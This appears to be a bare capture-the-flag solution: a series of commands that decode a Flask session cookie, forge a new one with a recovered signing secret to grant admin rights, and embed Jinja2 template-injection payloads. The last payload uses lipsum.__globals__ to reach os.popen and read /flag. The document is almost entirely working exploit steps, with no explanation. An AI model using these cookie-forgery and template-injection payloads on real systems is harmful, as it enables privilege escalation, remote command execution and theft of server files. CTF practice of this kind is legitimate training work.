'''
python flask_session_cookie_manager3.py decode -c "eyJyb2xlIjp7ImlzX2FkbWluIjowLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0ifX0.ZnNLMQ.gd9pi0P5pQV2KHfcpUiQzyVUR_c"



python flask_session_cookie_manager3.py encode -s "Th1s@one!seCret!" -t "{'role': {'is_admin':1,'name':'test','secret_key':'VGgxc0BvbmUhc2VDcmV0IQ=='}}" 

python flask_session_cookie_manager3.py encode -s "Th1s@one!seCret!" -t "{'role': {'is_admin':1,'name':'test','secret_key':'VGgxc0BvbmUhc2VDcmV0IQ==','flag':'{{7*7}}'}}" 


python flask_session_cookie_manager3.py encode -s "Th1s@one!seCret!" -t "{'role': {'is_admin':1,'name':'test','secret_key':'VGgxc0BvbmUhc2VDcmV0IQ==','flag':'{{lipsum.__globals__.get(\'os\').popen(\'cat /flag\').read()}}'}}" 


'''

                                                              
